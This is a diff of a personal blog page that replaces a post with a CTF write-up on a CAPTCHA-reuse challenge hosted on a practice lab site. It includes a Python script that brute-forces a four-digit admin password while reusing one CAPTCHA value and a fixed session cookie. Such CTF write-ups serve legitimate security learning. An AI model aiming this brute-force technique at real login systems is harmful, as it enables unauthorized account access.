@@ -4,9 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="一道简单的ACM, 小白的博客">
-    <meta name="description" content="#题目
-">
+    <meta name="keywords" content="CTF-验证码, 小白的博客">
+    <meta name="description" content="题目
+思路：1.看验证码是否可以重复使用2.可用burpsuit爆破或者保持会话脚本访问
+这道题目的验证码是可以重复使用的，具体：输入一个错误的pwd和一个正确的vcode时，网页跳转到 pwd error 的一个页面 而当vcode也错时">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +15,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>一道简单的ACM | 小白的博客</title>
+    <title>CTF-验证码 | 小白的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -288,13 +289,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        一道简单的ACM
+                        CTF-验证码
                     </div>
                 </div>
             </div>
@@ -386,8 +387,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/ACM/" target="_blank">
-                                <span class="chip bg-color">ACM</span>
+                            <a href="/tags/CTF/" target="_blank">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
                     </div>
@@ -398,8 +399,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/ACM/" class="post-category" target="_blank">
-                                ACM
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                CTF
                             </a>
                         
                     </div>
@@ -410,7 +411,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-12-20
+                    2019-12-26
                 </div>
 
                 
@@ -426,7 +427,30 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>#题目</p>
+                <p><a href="http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php" target="_blank" rel="noopener">题目</a></p>
+<p>思路：1.看验证码是否可以重复使用2.可用burpsuit爆破或者保持会话脚本访问</p>
+<p>这道题目的验证码是可以重复使用的，具体：输入一个错误的pwd和一个正确的vcode时，<br>网页跳转到 pwd error 的一个页面 而当vcode也错时 跳入 vcode error 的页面<br>用burpsuite的repeater功能在一个pwd error 页面重复提交不同的pwd 发现只会出现pwd error的错误<br>说明验证码是可以重复使用的</p>
+<p>用python</p>
+<pre><code>import requests
+import re
+url = &quot;http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php&quot;
+s=requests.session()
+head={&#39;cookie&#39;:&#39;PHPSESSID=f1c199bba2f35d61403985134f6eddaf&#39;}
+n=1
+for i in range(1000,10000):
+    data={&#39;username&#39;:&#39;admin&#39;,&#39;pwd&#39;:i,&#39;vcode&#39;:&#39;npcq&#39;,&#39;submit&#39;:&#39;submit&#39;}
+    html=s.post(url,data=data,headers=head)
+    html.encoding=&#39;utf-8&#39;
+    res=html.content.decode(&#39;utf-8&#39;)
+    if u&#39;vcode error&#39; in res:
+        print(&#39;vcode error&#39;)
+        break
+    if u&#39;pwd error&#39; in res:
+        print(&#39;正在破解……&#39;)
+    if u&#39;error&#39; not in res:
+        print(i,&#39;--正确的pwd&#39;)
+        print(res)
+        break</code></pre><p><strong>注意</strong> 这里的url是已经跳转到pwd error的url 这样才能保证vcode的正确</p>
 
             </div>
             <hr/>
@@ -567,7 +591,7 @@
                     </span>
                     <a href="https://wuzeqin99.github.io" class="b-link-green">小白的博客</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/12/20/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95ACM/" class="b-link-green">一道简单的ACM</a>
+                    <a href="/2019/12/26/CTF-%E9%AA%8C%E8%AF%81%E7%A0%81/" class="b-link-green">CTF-验证码</a>
                 </p>
             </div>
         </div>
@@ -592,19 +616,22 @@
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/12/26/CTF-%E9%AA%8C%E8%AF%81%E7%A0%81/">
+                <a href="/2019/12/26/CTF-%E5%BF%AB%E9%80%9F%E8%AE%A1%E7%AE%97/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="CTF-验证码">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="CTF-快速计算">
                         
-                        <span class="card-title">CTF-验证码</span>
+                        <span class="card-title">CTF-快速计算</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary">题目
-思路：1.看验证码是否可以重复使用2.可用burpsuit爆破或者保持会话脚本访问
-这道题目的验证码是可以重复使用的，具体：输入一个错误的pwd和一个正确的vcode时，网页跳转到 pwd error 的一个页面 而当vcode也错时</div>
+要求我们在两秒钟内得出答案人生苦短，我用python
+#!coding:utf-8
+import requests
+import re
+url = &quot;http://lab1.xseclab.com/xss2_0d557e6d</div>
                     <div class="publish-info">
                         <span class="publish-date">
                             <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-26
@@ -639,19 +666,17 @@
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/12/20/CTF-%E5%BA%B7%E6%BA%90%E7%A0%81/">
+                <a href="/2019/12/20/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95ACM/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="CTF-康源码">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="一道简单的ACM">
                         
-                        <span class="card-title">CTF-康源码</span>
+                        <span class="card-title">一道简单的ACM</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">题目
-F12 康源码
-
+                    <div class="summary">#题目
 </div>
                     <div class="publish-info">
                             <span class="publish-date">
@@ -661,8 +686,8 @@ F12 康源码
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category" target="_blank">
-                                    CTF
+                            <a href="/categories/ACM/" class="post-category" target="_blank">
+                                    ACM
                                 </a>
                             
                             
@@ -672,8 +697,8 @@ F12 康源码
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/" target="_blank">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/ACM/" target="_blank">
+                        <span class="chip bg-color">ACM</span>
                     </a>
                     
                 </div>
